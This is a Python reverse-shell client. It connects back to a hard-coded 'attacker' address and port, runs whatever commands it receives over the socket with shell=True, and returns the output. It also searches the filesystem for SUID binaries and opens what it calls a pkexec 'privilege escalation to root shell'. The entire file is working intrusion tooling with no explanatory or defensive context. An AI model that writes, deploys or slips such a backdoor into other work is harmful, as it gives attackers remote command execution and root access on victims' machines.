import socket
import subprocess
import time
import json
import threading
import os

def reliable_send(data):
    try:
        jsondata = json.dumps(data)
    except:
        jsondata = json.dumps("can't dump")
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

## use for find vulnability of suid 
## NOTE THAT : we use /usr/bin/pkexec
def find_suid_binaries():
    suid_files = []
    for root, dirs, files in os.walk('/'):
        for name in files:
            filepath = os.path.join(root, name)
            try:
                if os.stat(filepath).st_mode & 0o4000:
                    suid_files.append(filepath)
            except:
                continue
    return suid_files

def shell():
    process = None
    while True:
        try:
            command = reliable_recv()
            print(f"Command ==> {command}")
            if command.lower() == 'exit':
                break
            elif command.lower() == 'test':
                reliable_send("test...")

            elif command.lower() == 'findsuid':
                reliable_send(find_suid_binaries())                        

            elif command.endswith("/bin/bash"):
                pkexec_command = command.strip()
                process = subprocess.Popen(pkexec_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                # Start threads to read stdout and stderr
                threading.Thread(target=read_stream, args=(process.stdout,)).start()
                threading.Thread(target=read_stream, args=(process.stderr,)).start()
                reliable_send("Privilege escalation to root shell started.")
            elif process:
                # Send command to the pkexec process
                process.stdin.write(command.encode() + b'\n')
                process.stdin.flush()
                threading.Thread(target=check_non_output_command, args=(process,command)).start()
            else:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(result)
        except subprocess.CalledProcessError as e:
            reliable_send(str(e))

def read_stream(stream):
    for line in iter(stream.readline, b''):
        print(line.decode())
    stream.close()

def check_non_output_command(process,command):
    time.sleep(2)
    if process.poll() is None:
        reliable_send(f"Command {command} executed with no output.")

def connect():
    Attacker_tuple = ("192.168.56.1", 5021)
    while True:
        time.sleep(1)
        try:
            s.connect(Attacker_tuple)
            shell()
            s.close()
            break
        except Exception as e:
            print(e)
            connect()

if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect()
